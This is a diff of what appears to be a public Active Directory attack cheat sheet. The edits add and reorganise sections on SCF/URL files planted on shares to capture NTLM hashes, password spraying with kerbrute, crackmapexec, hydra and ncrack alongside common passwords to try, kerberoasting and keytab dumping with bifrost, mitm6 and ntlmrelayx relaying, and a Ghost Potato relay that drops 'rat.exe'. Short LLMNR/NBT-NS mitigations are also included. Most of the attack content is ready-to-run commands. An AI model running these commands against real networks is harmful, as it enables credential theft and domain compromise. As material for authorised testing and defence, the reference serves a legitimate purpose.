@@ -2,42 +2,64 @@
 
 ## Summary
 
-* [Tools](#tools)
-* [Most common paths to AD compromise](#most-common-paths-to-ad-compromise)
-  * [MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)](#ms14-068-microsoft-kerberos-checksum-validation-vulnerability)
-  * [Open Shares](#open-shares)
-  * [GPO - Pivoting with Local Admin & Passwords in SYSVOL](#gpo---pivoting-with-local-admin--passwords-in-sysvol)
-  * [Dumping AD Domain Credentials](#dumping-ad-domain-credentials-systemrootntdsntdsdit)
-    * Using ndtsutil
-    * Using Vshadow
-    * Using vssadmin
-    * Using DiskShadow
-    * Using Mimikatz DCSync
-    * Using Mimikatz sekurlsa
-  * [Password in AD User comment](#password-in-ad-user-comment)
-  * [Pass-the-Ticket Golden Tickets](#pass-the-ticket-golden-tickets)
-  * [Pass-the-Ticket Silver Tickets](#pass-the-ticket-silver-tickets)
-  * [Kerberoasting](#kerberoasting)
-  * [KRB_AS_REP roasting](#krb_as_rep-roasting)
-  * [Pass-the-Hash](#pass-the-hash)
-  * [OverPass-the-Hash (pass the key)](#overpass-the-hash-pass-the-key)
-  * [Capturing and cracking NTLMv2 hashes](#capturing-and-cracking-ntlmv2-hashes)
-  * [NTLMv2 hashes relaying](#ntlmv2-hashes-relaying)
-    * [MS08-068 NTLM reflection](#ms08-068-ntlm-reflection)
-    * [SMB Signing Disabled](#smb-signing-disabled)
-    * [Drop the MIC](#drop-the-mic)
-  * [SCF file attack against writeable share](#scf-file-attack-against-writeable-share)
-  * [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
-  * [Trust relationship between domains](#trust-relationship-between-domains)
-  * [Child Domain to Forest Compromise - SID Hijacking](#child-domain-to-forest-compromise---sid-hijacking)
-  * [Unconstrained delegation](#unconstrained-delegation)
-  * [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
-  * [Relay delegation with mitm6](#relay-delegation-with-mitm6)
-  * [PrivExchange attack](#privexchange-attack)
-  * [Password spraying](#password-spraying)
-  * [Extract accounts from /etc/krb5.keytab](#extract-accounts-from-etc-krb5-keytab)
-  * [PXE Boot image attack](#pxe-boot-image-attack)
-  * [Impersonating Office 365 Users on Azure AD Connect](#impersonating-office-365-users-on-azure-ad-connect)
+- [Active Directory Attacks](#active-directory-attacks)
+  - [Summary](#summary)
+  - [Tools](#tools)
+  - [Most common paths to AD compromise](#most-common-paths-to-ad-compromise)
+    - [MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)](#ms14-068-microsoft-kerberos-checksum-validation-vulnerability)
+    - [Open Shares](#open-shares)
+    - [SCF and URL file attack against writeable share](#scf-and-url-file-attack-against-writeable-share)
+    - [GPO - Pivoting with Local Admin & Passwords in SYSVOL](#gpo---pivoting-with-local-admin--passwords-in-sysvol)
+    - [Dumping AD Domain Credentials (%SystemRoot%\NTDS\Ntds.dit)](#dumping-ad-domain-credentials-systemrootntdsntdsdit)
+      - [Using ndtsutil](#using-ndtsutil)
+      - [Using Vshadow](#using-vshadow)
+      - [Using vssadmin](#using-vssadmin)
+      - [Using DiskShadow (a Windows signed binary)](#using-diskshadow-a-windows-signed-binary)
+      - [Using esentutl.exe](#using-esentutlexe)
+      - [Extract hashes from ntds.dit](#extract-hashes-from-ntdsdit)
+      - [Alternatives - modules](#alternatives---modules)
+      - [Using Mimikatz DCSync](#using-mimikatz-dcsync)
+      - [Using Mimikatz sekurlsa](#using-mimikatz-sekurlsa)
+    - [Password spraying](#password-spraying)
+      - [Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.](#using-kerbrute-a-tool-to-perform-kerberos-pre-auth-bruteforcing)
+      - [Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.](#using-crackmapexec-and-mp64-to-generate-passwords-and-spray-them-against-smb-services-on-the-network)
+      - [Using RDPassSpray to target RDP services.](#using-rdpassspray-to-target-rdp-services)
+      - [Using [hydra]() and [ncrack]() to target RDP services.](#using-hydra-and-ncrack-to-target-rdp-services)
+    - [Password in AD User comment](#password-in-ad-user-comment)
+    - [Pass-the-Ticket Golden Tickets](#pass-the-ticket-golden-tickets)
+      - [Using Mimikatz](#using-mimikatz)
+      - [Using Meterpreter](#using-meterpreter)
+      - [Using a ticket on Linux](#using-a-ticket-on-linux)
+    - [Pass-the-Ticket Silver Tickets](#pass-the-ticket-silver-tickets)
+    - [Kerberoasting](#kerberoasting)
+    - [KRB_AS_REP Roasting](#krbasrep-roasting)
+    - [Pass-the-Hash](#pass-the-hash)
+    - [OverPass-the-Hash (pass the key)](#overpass-the-hash-pass-the-key)
+      - [Using impacket](#using-impacket)
+      - [Using Rubeus](#using-rubeus)
+    - [Capturing and cracking NTLMv2 hashes](#capturing-and-cracking-ntlmv2-hashes)
+    - [NTLMv2 hashes relaying](#ntlmv2-hashes-relaying)
+      - [MS08-068 NTLM reflection](#ms08-068-ntlm-reflection)
+      - [SMB Signing Disabled and IPv4](#smb-signing-disabled-and-ipv4)
+      - [SMB Signing Disabled and IPv6](#smb-signing-disabled-and-ipv6)
+      - [Drop the MIC](#drop-the-mic)
+      - [Ghost Potato - CVE-2019-1384](#ghost-potato---cve-2019-1384)
+    - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
+    - [Trust relationship between domains](#trust-relationship-between-domains)
+    - [Child Domain to Forest Compromise - SID Hijacking](#child-domain-to-forest-compromise---sid-hijacking)
+    - [Unconstrained delegation](#unconstrained-delegation)
+      - [Find delegation](#find-delegation)
+      - [Monitor with Rubeus](#monitor-with-rubeus)
+      - [Force a connect back from the DC](#force-a-connect-back-from-the-dc)
+      - [Load the ticket](#load-the-ticket)
+      - [Mitigation](#mitigation)
+    - [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
+    - [Relay delegation with mitm6](#relay-delegation-with-mitm6)
+    - [PrivExchange attack](#privexchange-attack)
+    - [Extract accounts from /etc/krb5.keytab](#extract-accounts-from-etckrb5keytab)
+    - [PXE Boot image attack](#pxe-boot-image-attack)
+    - [Impersonating Office 365 Users on Azure AD Connect](#impersonating-office-365-users-on-azure-ad-connect)
+  - [References](#references)
 
 ## Tools
 
@@ -64,6 +86,7 @@
 * [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
 
   ```bash
+  apt-get install -y libssl-dev libffi-dev python-dev build-essential
   git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
   crackmapexec smb -L
   crackmapexec smb -M name_module -o VAR=DATA
@@ -261,6 +284,29 @@ smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
 sudo mount -t cifs -o username=<user>,password=<pass> //<IP>/Users folder
 ```
 
+### SCF and URL file attack against writeable share
+
+Drop the following `@something.scf` file inside a share and start listening with Responder : `responder -wrf --lm -v -I eth0`
+
+```powershell
+[Shell]
+Command=2
+IconFile=\\10.10.XX.XX\Share\test.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
+This attack also works with `.url` files and `responder -I eth0 -v`.
+
+```powershell
+[InternetShortcut]
+URL=whatever
+WorkingDirectory=whatever
+IconFile=\\192.168.1.29\%USERNAME%.icon
+IconIndex=1
+```
+
+
 ### GPO - Pivoting with Local Admin & Passwords in SYSVOL
 
 :triangular_flag_on_post: GPO Priorization : Organization Unit > Domain > Site > Local
@@ -433,6 +479,49 @@ sekurlsa::krbtgt
 lsadump::lsa /inject /name:krbtgt
 ```
 
+
+### Password spraying
+
+Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password. 
+
+> The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates. 
+
+#### Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
+
+> Kerberos pre-authentication errors are not logged in Active Directory with a normal Logon failure event (4625), but rather with specific logs to Kerberos pre-authentication failure (4771).
+
+```powershell
+root@kali:~$ ./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
+root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
+root@kali:~$ python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
+```
+
+#### Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.
+
+```powershell
+crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
+```
+
+#### Using [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) to target RDP services.
+
+```powershell
+python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
+```
+
+#### Using [hydra]() and [ncrack]() to target RDP services.
+
+```powershell
+hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
+ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
+```
+
+Most of the time the best passwords to spray are :
+
+- Password123
+- Welcome1
+- $Companyname1 : $Microsoft1
+- SeasonYear : Winter2019*
+
 ### Password in AD User comment
 
 ```powershell
@@ -552,6 +641,12 @@ Alternatively with [Rubeus](https://github.com/GhostPack/Rubeus)
 
 ```powershell
 .\rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt
+```
+
+Alternatively on macOS machine you can use [bifrost](https://github.com/its-a-feature/bifrost)
+
+```powershell
+./bifrost -action asktgs -ticket doIF<...snip...>QUw= -service host/dc1-lab.lab.local -kerberoast true
 ```
 
 Then crack the ticket with hashcat or john
@@ -715,7 +810,7 @@ msf > use exploit/windows/smb/smb_relay
 msf exploit(smb_relay) > show targets
 ```
 
-#### SMB Signing Disabled 
+#### SMB Signing Disabled and IPv4
 
 If a machine has `SMB signing`:`disabled`, it is possible to use Responder with Multirelay.py script to perform an `NTLMv2 hashes relay` and get a shell access on the machine.
 
@@ -749,6 +844,33 @@ If a machine has `SMB signing`:`disabled`, it is possible to use Responder with 
     $ proxychains mssqlclient.py contoso/normaluser1@192.168.48.230 -windows-auth
     ```
 
+Mitigations:
+
+ * Disable LLMNR via group policy
+    ```powershell
+    Open gpedit.msc and navigate to Computer Configuration > Administrative Templates > Network > DNS Client > Turn off multicast name resolution and set to Enabled
+    ```
+ * Disable NBT-NS
+    ```powershell
+    This can be achieved by navigating through the GUI to Network card > Properties > IPv4 > Advanced > WINS and then under "NetBIOS setting" select Disable NetBIOS over TCP/IP
+    ```
+
+#### SMB Signing Disabled and IPv6
+
+Since MS16-077 the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS.
+
+```powershell
+cme smb $hosts --gen-relay-list relay.txt
+
+# DNS takeover via IPv6, mitm6 will request an IPv6 address via DHCPv6
+mitm6 -i eth0 -d $domain
+
+# spoofing WPAD and relaying NTLM credentials
+http://ntlmrelayx.py -6 -wh $attacker_ip -of loot -tf relay.txt
+or 
+http://ntlmrelayx.py -6 -wh $attacker_ip -l /tmp -socks -debug
+```
+
 #### Drop the MIC
 
 > The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packets without invalidating the authentication, and thus enabling an attacker to remove the flags which would prevent relaying from SMB to LDAP
@@ -781,17 +903,17 @@ python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'
     secretsdump.py -k -no-pass second-dc-server.local -just-dc
     ```
 
+#### Ghost Potato - CVE-2019-1384
 
-### SCF file attack against writeable share
+Prerequisites:
+* User must be a member of the local Administrators group
+* User must be a member of the Backup Operators group
+* Token must be elevated
 
-Drop the following `something.scf` file inside a share and start listening with Responder : `responder -wrf --lm -v -I eth0`
+Using a modified version of ntlmrelayx : https://shenaniganslabs.io/files/impacket-ghostpotato.zip
 
 ```powershell
-[Shell]
-Command=2
-IconFile=\\10.10.XX.XX\Share\test.ico
-[Taskbar]
-Command=ToggleDesktop
+ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
 ```
 
 ### Dangerous Built-in Groups Usage
@@ -1051,46 +1173,6 @@ python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d 
 python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip
 ```
 
-### Password spraying
-
-Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password. 
-
-> The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates. 
-
-#### Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
-
-> Kerberos pre-authentication errors are not logged in Active Directory with a normal Logon failure event (4625), but rather with specific logs to Kerberos pre-authentication failure (4771).
-
-```powershell
-root@kali:~$ ./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
-root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
-root@kali:~$ python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
-```
-
-#### Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.
-
-```powershell
-crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
-```
-
-#### Using [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) to target RDP services.
-
-```powershell
-python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
-```
-
-#### Using [hydra]() and [ncrack]() to target RDP services.
-
-```powershell
-hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
-ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
-```
-
-Most of the time the best passwords to spray are :
-
-- Password1
-- Welcome1
-- $Companyname1
 
 ### Extract accounts from /etc/krb5.keytab
 
@@ -1107,6 +1189,12 @@ $ klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
 	 Key: 6b3723410a3c54692e400a5862256e0a
 	 Time stamp: Oct 07,  2019 09:12:02
 [...]
+```
+
+On macOS you can use `bifrost`.
+
+```powershell
+./bifrost -action dump -source keytab -path test
 ```
 
 Connect to the machine using the account and the hash with CME.
